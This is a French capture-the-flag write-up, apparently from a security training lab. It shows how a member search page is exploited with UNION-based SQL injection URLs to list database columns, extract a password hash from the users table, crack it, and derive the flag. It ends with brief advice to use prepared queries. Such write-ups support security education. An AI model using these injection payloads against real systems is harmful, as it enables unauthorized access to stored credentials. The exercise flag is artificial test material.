# Users injections

## Trouver la faille :

En allant sur la page de recherche d'un membre (`page=member`), et en cherchant à tâtons, on trouve un utilisateur interessant :

```
ID: 5
First name: Flag
Surname : GetThe
```

On fait une injection SQL pour trouver les noms des colonnes de toutes les tables :
`http://192.168.1.12/?page=member&id=1 union all select 1,column_name from information_schema.columns&Submit=Submit`

On trouve plusieurs noms de colonnes et on en déduis en testant avec des injections (et un peu de logique) que celles concernant les utilisateurs sont :

```
- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`
```

On fait donc des injections pour récupérer les informations de l'utilisateur à l'ID 5 :

`http://192.168.1.12/?page=member&id=1 union all select 1,Commentaire from users&Submit=Submit`

La colonne Commentaire nous donne :
`Decrypt this password -> then lower all the char. Sh256 on it and it's good !`

Malheureusement une tentative d'injection pour la colonne `password` ne donne rien de concluant :
`Unknown column 'password' in 'field list'`

On tente alors les autres colonnes pour trouver quelque chose qui ressemblerait à un hash.

La colonne `countersign` correspond à ce que l'on recherche :

`http://192.168.1.12/?page=member&id=1 union all select 1,countersign from users&Submit=Submit`

On obtiens le hash suivant : `5ff9d0165b4f92b14994e5c685cdce28`

On le décrypte avec le site https://md5decrypt.net/, et on obtiens le mot suivant : `FortyTwo`

On est donc sur la bonne piste !

Il ne nous reste plus qu'à le mettre en miniscule et à le hash :

```
echo -n FortyTwo | tr '[:upper:]' '[:lower:]' | openssl dgst -sha256
```

FLAG : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## S'en prémunir :

Préparer les requêtes, avec par exemple un ORM. Cela empêche de faire des injections SQL.
